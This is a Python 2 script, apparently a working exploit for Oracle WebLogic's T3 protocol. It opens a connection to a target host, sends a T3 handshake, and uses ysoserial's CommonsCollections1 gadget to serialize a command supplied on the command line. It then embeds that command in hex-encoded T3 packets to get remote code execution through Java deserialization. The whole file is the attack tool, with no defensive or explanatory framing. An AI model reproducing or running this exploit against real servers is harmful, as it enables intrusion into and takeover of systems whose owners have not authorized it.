import socket,ssl,sys,binascii,base64,os
def weblogic(ip,port,cmd):
    try:
        if (port == 443):
            sock = ssl.wrap_socket(socket.socket(socket.AF_INET, socket.SOCK_STREAM))
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (ip, int(port))
        print 'connecting to %s port %s' % (server_address,port)
        sock.connect(server_address)
        #headers='t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://us-l-breens:7001\n\n'
        t3 = '74332031322E322E310A41533A3235350A484C3A31390A4D533A31303030303030300A50553A74333A2F2F75732D6C2D627265656E733A373030310A0A'
        #a
        print 'sending "%s"' % t3
        sock.sendall(t3.decode('hex'))
        data = sock.recv(1024)
        print >>sys.stderr, 'received "%s"' % data
        cmd = "java -jar ysoserial-0.0.5-SNAPSHOT-all.jar CommonsCollections1 \" %s\" >cmd" % cmd
        os.system(cmd)
        cmd = binascii.b2a_hex(open('cmd', "rb").read())
        payloadh= '00000970016501ffffffffffffffff000000690000ea60000000182946da33c66e124576343378d5a54205c404ebbc6a4e332a027973720078720178720278700000000a000000030000000000000000007070707070700000000a000000030000000000000000007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000'
        payloadd= 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
        #print binascii.b2a_hex(base64.b64decode(payloadd))
        #print base64.b64decode(payloadd)
        payload = payloadh+cmd+payloadd
        payloadlen = '%s'%'{:04x}'.format(len(payload)/2)
        print "len/2:%s"% str(len(payload)/2)
        print "payload for hex:%s" % str(payloadlen)
        payload = payload.replace('0970',payloadlen)
        sock.send(payload.decode('hex'))
        print payload
        open('cmd', "rb").close
    except Exception , e:print "error:"+str(e)
weblogic(sys.argv[1],sys.argv[2],sys.argv[3])